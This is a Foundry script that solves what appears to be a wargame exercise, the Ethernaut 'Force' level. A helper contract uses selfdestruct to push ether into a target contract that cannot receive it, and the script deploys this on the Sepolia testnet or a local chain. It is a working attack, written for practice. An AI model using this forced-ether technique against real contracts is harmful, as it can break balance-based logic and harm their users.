// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Force} from "src/Force.sol";

contract ForceAttack {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }

    fallback() external {}
}

contract ForceScript is Script {
    error ForceScript__failedAttack();
    Force target;
    ForceAttack attackContract;

    function run() external returns (Force) {
        if (block.chainid == 11155111) {
            vm.startBroadcast(); //////////////////////////////////////////////////////////////////////
            target = Force(vm.envAddress("FORCE_TARGET"));
            attackContract = new ForceAttack{value: 0.0001 ether}(
                address(target)
            );
            vm.stopBroadcast(); //////////////////////////////////////////////////////////////////////
        } else if (block.chainid == 31337 && address(target) == address(0)) {
            vm.startBroadcast(); /////////////////////////////////////////////////////////////////////
            target = new Force();
            attackContract = new ForceAttack(address(target));
            vm.stopBroadcast(); ///////////////////////////////////////////////////////////////////////
        }
        return target;
    }
}
